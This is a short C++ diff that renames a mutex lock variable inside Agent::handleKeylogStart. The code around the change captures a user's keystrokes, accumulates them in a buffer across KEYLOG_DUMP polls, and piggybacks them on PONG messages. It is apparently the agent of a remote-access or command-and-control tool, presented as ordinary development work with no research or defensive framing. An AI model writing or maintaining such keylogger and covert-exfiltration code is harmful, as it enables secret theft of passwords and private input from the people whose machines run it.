@@ -199,7 +199,7 @@ void Agent::handleKeylogStart() {
             // Append to shared buffer for PONG piggybacking — accumulates
             // across multiple KEYLOG_DUMP polls until the next PONG sends it.
             {
-                std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
+                std::lock_guard<std::mutex> pending_lock(m_keylog_pending_mutex);
                 if (m_keylog_pending_data.size() + keystrokes.size() <= KeyLogger::MAX_BUFFER_SIZE) {
                     m_keylog_pending_data += keystrokes;
                 }
